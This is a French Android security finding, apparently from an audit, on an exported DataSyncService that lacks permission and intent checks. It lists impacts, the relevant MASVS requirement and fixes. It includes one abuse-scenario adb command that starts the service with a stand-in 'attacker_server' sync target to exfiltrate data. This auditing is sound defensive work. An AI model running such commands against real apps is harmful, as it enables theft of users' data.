# Analyse des risques – Services exportés

## com.example.vulnerableapp.DataSyncService

### État
- **Exporté** : Oui
- **Permission requise** : Aucune
- **Validation d'intent** : Absente (constatée par analyse du manifeste)

### Risque identifié
Un service exporté sans protection ni validation des intents entrants peut être démarré ou lié par n'importe quelle application tierce. En l'absence de validation, des intents forgés peuvent déclencher des synchronisations arbitraires, transmettre de fausses données ou provoquer une consommation excessive de ressources (batterie, bande passante).

### Scénario d'abus
```bash
# Démarrage du service depuis l'extérieur
adb shell am startservice -n com.example.vulnerableapp/.DataSyncService \
  --es "sync_target" "attacker_server"
```
→ Le service de synchronisation est démarré avec des paramètres contrôlés par l'attaquant.

### Impact
- Exfiltration de données via un serveur contrôlé par l'attaquant
- Déni de service par déclenchement répété
- Exécution d'opérations privilégiées sans consentement de l'utilisateur

### Référence MASVS
MSTG-PLATFORM-2 — Toutes les entrées provenant de sources externes doivent être validées et rejetées si invalides.

---

## Recommandations
1. Définir `android:exported="false"` si le service n'est utilisé qu'en interne.
2. Si l'export est nécessaire, ajouter `android:permission="com.example.vulnerableapp.permission.DATA_SYNC"` avec niveau `signature`.
3. Implémenter une validation stricte des intents dans `onStartCommand` (vérification de l'action, des extras attendus et de l'identité de l'appelant).
